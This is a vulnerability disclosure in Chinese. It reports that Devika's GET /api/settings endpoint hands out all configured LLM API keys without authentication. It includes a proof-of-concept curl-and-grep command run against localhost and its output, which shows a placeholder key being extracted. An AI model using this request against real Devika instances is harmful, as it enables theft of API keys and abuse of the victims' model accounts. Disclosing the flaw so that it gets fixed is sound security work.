# Devika：未认证读取全部 LLM API 密钥（GET /api/settings）

## 描述

`GET /api/settings`（devika.py:195-199）把 `config.toml` 的完整配置原样返回，包括 `API_KEYS` 段落中已配置的所有真实密钥（CLAUDE/GEMINI/OPENAI/BING 等）。接口无任何认证。

## 影响

任何能访问 1337 端口的网络客户端用一个 GET 拿到服务器上配置的全部 LLM API 密钥——直接的经济与数据损失（攻击者可用这些 key 消费配额、访问受害者的模型账户）。

## PoC

```bash
# 1. 前提：config.toml 中已配置任意密钥（模拟真实部署）
#    [API_KEYS] 段 CLAUDE = "sk-ant-REPRO-FAKE-KEY-9d8e"
# 2. 启动 devika 后，无凭据读取：
curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-[A-Z0-9-]*'
```

## 执行结果

```
$ curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-REPRO-FAKE-KEY-9d8e'
sk-ant-REPRO-FAKE-KEY-9d8e
[F02] API key disclosed unauth: YES
```
